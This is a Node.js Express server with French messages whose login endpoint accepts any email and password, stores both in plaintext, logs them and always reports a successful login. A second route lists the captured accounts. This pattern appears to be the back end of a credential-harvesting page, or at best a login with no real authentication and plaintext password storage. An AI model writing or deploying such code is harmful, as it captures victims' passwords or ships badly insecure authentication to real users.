const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const users = [];

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;

  if (!username || !username.trim()) {
    return res.status(400).json({ success: false, message: 'Email requis' });
  }
  if (!password || !password.trim()) {
    return res.status(400).json({ success: false, message: 'Mot de passe requis' });
  }

  users.push({
    username: username.trim(),
    password: password.trim(),
    date: new Date().toISOString()
  });

  console.log('Nouvelle connexion:', username.trim());

  res.json({ success: true, message: 'Connexion réussie' });
});

app.get('/api/users', (req, res) => {
  res.json(users.map(u => ({ username: u.username, date: u.date })));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('Serveur démarré sur le port ' + PORT);
});